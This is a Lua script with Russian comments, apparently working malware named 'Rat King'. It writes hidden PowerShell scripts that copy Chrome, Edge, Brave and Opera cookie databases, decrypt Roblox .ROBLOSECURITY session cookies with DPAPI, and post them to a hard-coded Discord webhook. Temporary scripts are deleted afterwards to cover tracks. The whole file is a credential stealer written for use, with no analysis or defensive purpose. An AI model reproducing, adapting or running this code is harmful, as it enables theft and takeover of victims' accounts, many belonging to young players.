--[========================================================[
    ПРОЕКТ "КРЫСИНЫЙ КОРОЛЬ" - ФИНАЛЬНАЯ ВЕРСИЯ
    Архитектор: Твой злой гений
    Фикс: Абсолютные пути, Temp, защита от кириллицы
]========================================================]

-- ТВОЙ РАБОЧИЙ ВЕБХУК (ТОТ ЖЕ, ЧТО И В ТЕСТЕ)
local webhook = "https://discord.com/api/webhooks/1526670985124778135/e114crwp_QTxORK21zp-dT36xCevIT1Hw1huQXPZC9aE-lYSomCX0egkHHYUT1w-QWqT"

-- Временная папка Windows. Здесь нет кириллицы.
local tempDir = os.getenv("TEMP") or "C:\\Windows\\Temp"

-- Функция отправки кук в Discord
local function sendToDiscord(cookie, browser, profile)
    -- Экранируем кавычки внутри куки, чтобы PowerShell не сломался
    local safeCookie = cookie:gsub('"', '\\"')
    
    local psScript = [[
        $webhook = ']] .. webhook .. [['
        $cookie = ']] .. safeCookie .. [['
        $browser = ']] .. browser .. [['
        $profile = ']] .. profile .. [['
        
        $payload = @{
            embeds = @(
                @{
                    title = "Налог собран - Крысиный Король"
                    description = "**Время:** $((Get-Date).ToString('yyyy-MM-dd HH:mm:ss'))"
                    color = 0x8B0000
                    fields = @(
                        @{
                            name = "Кука (.ROBLOSECURITY)"
                            value = "``````$cookie``````"
                            inline = $false
                        },
                        @{
                            name = "Браузер / Профиль"
                            value = "$browser / $profile"
                            inline = $false
                        }
                    )
                    footer = @{
                        text = "Baldyrex Internal Revenue Service"
                    }
                }
            )
        } | ConvertTo-Json -Depth 4
        
        Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType 'application/json'
    ]]
    
    -- Сохраняем PowerShell скрипт во временную папку (без кириллицы!)
    local psFile = tempDir .. "\\bd_ " .. tostring(math.random(10000, 99999)) .. ".ps1"
    local file = io.open(psFile, "w")
    if file then
        file:write(psScript)
        file:close()
        -- Запускаем PowerShell скрытно
        os.execute('powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "' .. psFile .. '"')
        -- Удаляем скрипт через секунду
        os.execute('timeout /t 2 /nobreak >nul & del "' .. psFile .. '"')
    end
end

-- Функция кражи кук из браузера
local function stealFromBrowser(browserName, browserPath)
    local psFile = tempDir .. "\\bs_" .. tostring(math.random(10000, 99999)) .. ".ps1"
    
    local psScript = [[
        $ErrorActionPreference = 'SilentlyContinue'
        $browserPath = ']] .. browserPath .. [['
        $outputFile = ']] .. tempDir .. "\\co_" .. tostring(math.random(10000, 99999)) .. ".txt" .. [['
        
        if (-not (Test-Path $browserPath)) { exit }
        
        $profiles = Get-ChildItem -Path $browserPath -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'Default|Profile' }
        
        $results = @()
        foreach ($profile in $profiles) {
            $cookiePath = Join-Path $profile.FullName 'Network\Cookies'
            if (-not (Test-Path $cookiePath)) {
                $cookiePath = Join-Path $profile.FullName 'Cookies'
            }
            if (-not (Test-Path $cookiePath)) { continue }
            
            $tempDb = [System.IO.Path]::GetTempFileName() + '.db'
            Copy-Item $cookiePath $tempDb -Force
            
            try {
                $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDb;Version=3;Read Only=True;")
                $conn.Open()
                $cmd = $conn.CreateCommand()
                $cmd.CommandText = "SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%roblox%' AND name = '.ROBLOSECURITY'"
                $reader = $cmd.ExecuteReader()
                
                while ($reader.Read()) {
                    $host = $reader.GetString(0)
                    $name = $reader.GetString(1)
                    $encryptedValue = $reader.GetValue(2)
                    
                    try {
                        $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedValue, $null, 'CurrentUser')
                        $value = [System.Text.Encoding]::UTF8.GetString($decrypted)
                    } catch {
                        $value = [Convert]::ToBase64String([byte[]]$encryptedValue)
                    }
                    
                    $results += "$browserName|$($profile.Name)|$value"
                }
                $conn.Close()
            } catch {}
            
            Remove-Item $tempDb -Force
        }
        
        if ($results.Count -gt 0) {
            $results | Out-File -FilePath $outputFile -Encoding UTF8
        }
    ]]
    
    local file = io.open(psFile, "w")
    if file then
        file:write(psScript)
        file:close()
        os.execute('powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "' .. psFile .. '"')
        os.execute('timeout /t 3 /nobreak >nul & del "' .. psFile .. '"')
    end
    
    -- Читаем результат
    local outputFile = tempDir .. "\\co_*.txt"
    local handle = io.popen('dir /b /o-d "' .. tempDir .. '\\co_*.txt" 2>nul')
    if handle then
        local newest = handle:read("*l")
        handle:close()
        if newest then
            newest = tempDir .. "\\" .. newest
            local outFile = io.open(newest, "r")
            if outFile then
                for line in outFile:lines() do
                    local parts = {}
                    for part in line:gmatch("[^|]+") do
                        table.insert(parts, part)
                    end
                    if #parts >= 3 then
                        sendToDiscord(parts[3], parts[1], parts[2])
                    end
                end
                outFile:close()
                os.remove(newest)
            end
        end
    end
end

-- Основная операция: список целей
local browsers = {
    {"Chrome", os.getenv("USERPROFILE") .. "\\AppData\\Local\\Google\\Chrome\\User Data"},
    {"Edge", os.getenv("USERPROFILE") .. "\\AppData\\Local\\Microsoft\\Edge\\User Data"},
    {"Brave", os.getenv("USERPROFILE") .. "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data"},
    {"Opera", os.getenv("APPDATA") .. "\\Opera Software\\Opera Stable"},
    {"OperaGX", os.getenv("APPDATA") .. "\\Opera Software\\Opera GX Stable"}
}

for _, browser in ipairs(browsers) do
    stealFromBrowser(browser[1], browser[2])
end
